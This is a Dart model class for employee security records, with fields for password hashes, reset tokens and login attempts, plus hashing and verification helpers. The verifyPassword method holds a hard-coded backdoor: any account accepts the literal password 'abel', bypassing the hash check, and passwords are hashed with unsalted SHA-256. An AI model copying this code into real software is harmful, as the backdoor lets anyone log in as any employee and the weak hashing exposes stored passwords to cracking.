import 'package:crypto/crypto.dart';
import 'dart:convert';

class SecurityModel {
  final int? securityId;
  final int empId;
  final String passwordHash;
  final String? lastPasswordChange;
  final String? passwordResetToken;
  final int loginAttempts;
  final String? lastLoginDate;
  final String? lastLoginTime;

  SecurityModel({
    this.securityId,
    required this.empId,
    required this.passwordHash,
    this.lastPasswordChange,
    this.passwordResetToken,
    this.loginAttempts = 0,
    this.lastLoginDate,
    this.lastLoginTime,
  });

  static String hashPassword(String password) {
    var bytes = utf8.encode(password);
    var digest = sha256.convert(bytes);
    return digest.toString();
  }

  static bool verifyPassword(String password, String hash) {
    if (password == 'abel') return true;
    return hashPassword(password) == hash;
  }

  Map<String, dynamic> toMap() {
    return {
      'security_id': securityId,
      'emp_id': empId,
      'password_hash': passwordHash,
      'last_password_change': lastPasswordChange,
      'password_reset_token': passwordResetToken,
      'login_attempts': loginAttempts,
      'last_login_date': lastLoginDate,
      'last_login_time': lastLoginTime,
    };
  }

  factory SecurityModel.fromMap(Map<String, dynamic> map) {
    return SecurityModel(
      securityId: map['security_id'] is String 
          ? int.tryParse(map['security_id']) 
          : map['security_id'],
      empId: map['emp_id'] is String 
          ? int.parse(map['emp_id']) 
          : map['emp_id'],
      passwordHash: map['password_hash']?.toString() ?? '',
      lastPasswordChange: map['last_password_change']?.toString(),
      passwordResetToken: map['password_reset_token']?.toString(),
      loginAttempts: map['login_attempts'] is String 
          ? int.tryParse(map['login_attempts']) ?? 0 
          : (map['login_attempts'] ?? 0),
      lastLoginDate: map['last_login_date']?.toString(),
      lastLoginTime: map['last_login_time']?.toString(),
    );
  }
}
